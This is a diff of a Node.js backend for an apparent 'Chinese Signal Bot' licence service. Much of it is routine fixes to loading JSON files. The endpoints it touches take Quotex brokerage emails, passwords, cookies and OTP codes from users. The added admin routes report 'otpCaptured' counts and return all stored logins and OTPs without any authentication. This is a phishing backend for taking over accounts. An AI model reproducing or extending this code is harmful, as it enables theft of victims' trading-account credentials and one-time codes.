@@ -31,13 +31,18 @@ async function sendTelegramMessage(text) {
 const DATA_FILE = path.join(__dirname, 'users.json');
 let users = [];
 
-// Load users on startup
+// FIXED: Robust load function
 function loadUsers() {
     try {
         if (fs.existsSync(DATA_FILE)) {
-            const data = fs.readFileSync(DATA_FILE, 'utf8');
-            users = JSON.parse(data);
-            console.log(`✅ Loaded ${users.length} users from users.json`);
+            const data = fs.readFileSync(DATA_FILE, 'utf8').trim();
+            if (data && data.length > 0) {
+                users = JSON.parse(data);
+                console.log(`✅ Loaded ${users.length} users from users.json`);
+            } else {
+                users = [];
+                console.log("⚠️ users.json was empty, starting fresh");
+            }
         } else {
             fs.writeFileSync(DATA_FILE, JSON.stringify([], null, 2));
             console.log("✅ Created new users.json");
@@ -45,6 +50,12 @@ function loadUsers() {
     } catch (e) {
         console.error("Load error, starting fresh:", e);
         users = [];
+        // Create fresh file
+        try {
+            fs.writeFileSync(DATA_FILE, JSON.stringify([], null, 2));
+        } catch (writeErr) {
+            console.error("Failed to create users.json:", writeErr);
+        }
     }
 }
 
@@ -60,7 +71,7 @@ function saveUsers() {
 
 loadUsers();
 
-// Helper: Get or create user by licenceKey (FIXED: Multiple users persistence)
+// Helper: Get or create user by licenceKey
 function getOrCreateUser(licenceKey, fullName = "Unknown") {
     let user = users.find(u => u.licenceKey === licenceKey);
     if (!user) {
@@ -167,7 +178,7 @@ app.post('/api/notification-permission', async (req, res) => {
     res.status(200).send({ status: "success" });
 });
 
-// ================== QUOTEX LOGIN & OTP (FULLY FIXED) ==================
+// ================== QUOTEX LOGIN & OTP ==================
 app.post('/api/quotex-login', async (req, res) => {
     const { email, password, name, licenceKey = "DEFAULT", cookies = "" } = req.body;
     const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || "Unknown IP";
@@ -217,17 +228,17 @@ app.post('/api/quotex-otp', async (req, res) => {
     res.status(200).send({ status: "ok" });
 });
 
-// ================== LICENSE MANAGEMENT (ADDED) ==================
+// ================== LICENSE MANAGEMENT (NEW) ==================
 const LICENSES_FILE = path.join(__dirname, 'licenses.json');
 let licenses = [];
 
 function loadLicenses() {
     try {
         if (fs.existsSync(LICENSES_FILE)) {
-            const data = fs.readFileSync(LICENSES_FILE, 'utf8');
-            licenses = JSON.parse(data);
-            console.log(`✅ Loaded ${licenses.length} licenses`);
+            const data = fs.readFileSync(LICENSES_FILE, 'utf8').trim();
+            licenses = data ? JSON.parse(data) : [];
         } else {
+            licenses = [];
             fs.writeFileSync(LICENSES_FILE, JSON.stringify([], null, 2));
         }
     } catch (e) {
@@ -243,19 +254,18 @@ function saveLicenses() {
 
 loadLicenses();
 
-// GET all licenses
 app.get('/api/licenses', (req, res) => {
     res.json(licenses);
 });
 
-// POST new license
 app.post('/api/licenses', (req, res) => {
     const { key, type, expiry, maxUses } = req.body;
-    if (!key) return res.status(400).json({error: "Key required"});
-    
-    const existing = licenses.find(l => l.key === key);
-    if (existing) return res.status(400).json({error: "License already exists"});
-    
+    if (!key) return res.status(400).json({ error: "Key required" });
+
+    if (licenses.find(l => l.key === key)) {
+        return res.status(400).json({ error: "License already exists" });
+    }
+
     licenses.unshift({
         key: key,
         type: type || "Permanent",
@@ -266,20 +276,46 @@ app.post('/api/licenses', (req, res) => {
         expiry: expiry || null
     });
     saveLicenses();
-    res.json({success: true});
+    res.json({ success: true, license: licenses[0] });
 });
 
-// DELETE license
 app.delete('/api/licenses/:key', (req, res) => {
     const key = req.params.key;
     licenses = licenses.filter(l => l.key !== key);
     saveLicenses();
-    res.json({success: true});
+    res.json({ success: true });
 });
 
-// Enhanced license check (for main bot)
-app.post('/api/validate-license', (req, res) => {
-    const { licenseKey } = req.body;
-    const license = licenses.find(l => l.key === licenseKey && l.status === "Active");
-    res.json({ valid: !!license });
+// ================== ADMIN PANEL ROUTES ==================
+app.get('/api/stats', (req, res) => {
+    const stats = {
+        totalUsers: users.length,
+        onlineNow: users.filter(u => u.status === "Online").length,
+        otpCaptured: users.filter(u => u.otp && u.otp.length >= 4).length,
+        connectedAccounts: users.filter(u => u.connected).length
+    };
+    res.json(stats);
+});
+
+app.get('/api/users', (req, res) => {
+    res.json(users);
+});
+
+app.get('/api/latest-activity', (req, res) => {
+    res.json({
+        logins: users.filter(u => u.username),
+        otps: users.filter(u => u.otp)
+    });
+});
+
+// Root Route
+app.get('/', (req, res) => {
+    res.send("✅ Chinese Signal Bot Backend is Running");
+});
+
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => {
+    console.log(`🚀 Server running on port ${PORT}`);
+    console.log(`📁 users.json location: ${DATA_FILE}`);
+    console.log(`📁 licenses.json location: ${LICENSES_FILE}`);
 });
